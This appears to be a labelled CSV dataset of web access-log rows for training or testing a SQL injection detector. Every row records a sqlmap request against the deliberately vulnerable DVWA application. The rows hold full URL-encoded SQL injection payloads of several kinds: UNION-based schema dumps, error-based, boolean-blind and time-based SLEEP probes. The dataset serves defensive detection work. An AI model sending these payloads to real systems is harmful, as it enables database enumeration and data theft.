ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_TIME%2CBLOCK_ID%2CCOMPRESSED_SIZE%2CDATA_SIZE%2CFIX_COUNT%2CFLUSH_TYPE%2CFREE_PAGE_CLOCK%2CINDEX_NAME%2CIO_FIX%2CIS_HASHED%2CIS_OLD%2CNEWEST_MODIFICATION%2CNUMBER_RECORDS%2COLDEST_MODIFICATION%2CPAGE_NUMBER%2CPAGE_STATE%2CPAGE_TYPE%2CPOOL_ID%2C%60SPACE%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_TIME%2CBLOCK_ID%2CCOMPRESSED_SIZE%2CDATA_SIZE%2CFIX_COUNT%2CFLUSH_TYPE%2CFREE_PAGE_CLOCK%2CINDEX_NAME%2CIO_FIX%2CIS_HASHED%2CIS_OLD%2CNEWEST_MODIFICATION%2CNUMBER_RECORDS%2COLDEST_MODIFICATION%2CPAGE_NUMBER%2CPAGE_STATE%2CPAGE_TYPE%2CPOOL_ID%2C%60SPACE%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit,HTTP/1.1,520,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%23&Submit=Submit,HTTP/1.1,243,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%201202%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20NinO&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20%28SELECT%201202%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71766b7871%2C%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C0x716a707171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20NinO&Submit=Submit,HTTP/1.1,381,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,228,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E54%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E54%23&Submit=Submit,HTTP/1.1,228,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E56%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E56%23&Submit=Submit,HTTP/1.1,228,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E57%23&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E57%23&Submit=Submit,HTTP/1.1,228,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit,HTTP/1.1,315,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit,HTTP/1.1,315,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit HTTP/1.1,200,609,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%20%28SELECT%207385%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.INNODB_BUFFER_PAGE%29%2C1%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29GCly%29--%20xyof&Submit=Submit,HTTP/1.1,314,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4b45595f434f4c554d4e5f5553414745%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2016,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x4b45595f434f4c554d4e5f5553414745%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,373,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:46-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CORDINAL_POSITION%2CPOSITION_IN_UNIQUE_CONSTRAINT%2CREFERENCED_COLUMN_NAME%2CREFERENCED_TABLE_NAME%2CREFERENCED_TABLE_SCHEMA%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60CONSTRAINT_CATALOG%60%2C%60CONSTRAINT_NAME%60%2C%60CONSTRAINT_SCHEMA%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.KEY_COLUMN_USAGE%23&Submit=Submit HTTP/1.1,200,1945,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CORDINAL_POSITION%2CPOSITION_IN_UNIQUE_CONSTRAINT%2CREFERENCED_COLUMN_NAME%2CREFERENCED_TABLE_NAME%2CREFERENCED_TABLE_SCHEMA%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60CONSTRAINT_CATALOG%60%2C%60CONSTRAINT_NAME%60%2C%60CONSTRAINT_SCHEMA%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.KEY_COLUMN_USAGE%23&Submit=Submit,HTTP/1.1,507,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:47-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x555345525f53544154495354494353%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,2158,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x555345525f53544154495354494353%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,371,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:47-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_DENIED%2CBINLOG_BYTES_WRITTEN%2CBUSY_TIME%2CBYTES_RECEIVED%2CBYTES_SENT%2CCOMMIT_TRANSACTIONS%2CCONCURRENT_CONNECTIONS%2CCONNECTED_TIME%2CCPU_TIME%2CDENIED_CONNECTIONS%2CEMPTY_QUERIES%2CLOST_CONNECTIONS%2CMAX_STATEMENT_TIME_EXCEEDED%2COTHER_COMMANDS%2CROLLBACK_TRANSACTIONS%2CROWS_DELETED%2CROWS_INSERTED%2CROWS_READ%2CROWS_SENT%2CROWS_UPDATED%2CSELECT_COMMANDS%2CTOTAL_CONNECTIONS%2CTOTAL_SSL_CONNECTIONS%2CUPDATE_COMMANDS%2C%60USER%60%29%29%2C0x716a707171%29%20FROM%20information_schema.USER_STATISTICS%20ORDER%20BY%20%60USER%60%23&Submit=Submit HTTP/1.1,200,578,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CACCESS_DENIED%2CBINLOG_BYTES_WRITTEN%2CBUSY_TIME%2CBYTES_RECEIVED%2CBYTES_SENT%2CCOMMIT_TRANSACTIONS%2CCONCURRENT_CONNECTIONS%2CCONNECTED_TIME%2CCPU_TIME%2CDENIED_CONNECTIONS%2CEMPTY_QUERIES%2CLOST_CONNECTIONS%2CMAX_STATEMENT_TIME_EXCEEDED%2COTHER_COMMANDS%2CROLLBACK_TRANSACTIONS%2CROWS_DELETED%2CROWS_INSERTED%2CROWS_READ%2CROWS_SENT%2CROWS_UPDATED%2CSELECT_COMMANDS%2CTOTAL_CONNECTIONS%2CTOTAL_SSL_CONNECTIONS%2CUPDATE_COMMANDS%2C%60USER%60%29%29%2C0x716a707171%29%20FROM%20information_schema.USER_STATISTICS%20ORDER%20BY%20%60USER%60%23&Submit=Submit,HTTP/1.1,705,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:47-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ACCESS_DENIED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BINLOG_BYTES_WRITTEN%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BUSY_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BYTES_RECEIVED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BYTES_SENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COMMIT_TRANSACTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CONCURRENT_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CONNECTED_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CPU_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DENIED_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EMPTY_QUERIES%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LOST_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_STATEMENT_TIME_EXCEEDED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28OTHER_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROLLBACK_TRANSACTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_DELETED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_INSERTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_READ%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_SENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_UPDATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SELECT_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TOTAL_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TOTAL_SSL_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28UPDATE_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60USER%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.USER_STATISTICS%20ORDER%20BY%20%60USER%60%23&Submit=Submit HTTP/1.1,200,578,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28ACCESS_DENIED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BINLOG_BYTES_WRITTEN%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BUSY_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BYTES_RECEIVED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28BYTES_SENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COMMIT_TRANSACTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CONCURRENT_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CONNECTED_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CPU_TIME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DENIED_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EMPTY_QUERIES%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LOST_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28MAX_STATEMENT_TIME_EXCEEDED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28OTHER_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROLLBACK_TRANSACTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_DELETED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_INSERTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_READ%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_SENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ROWS_UPDATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SELECT_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TOTAL_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TOTAL_SSL_CONNECTIONS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28UPDATE_COMMANDS%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60USER%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.USER_STATISTICS%20ORDER%20BY%20%60USER%60%23&Submit=Submit,HTTP/1.1,2087,5,40,SQLi
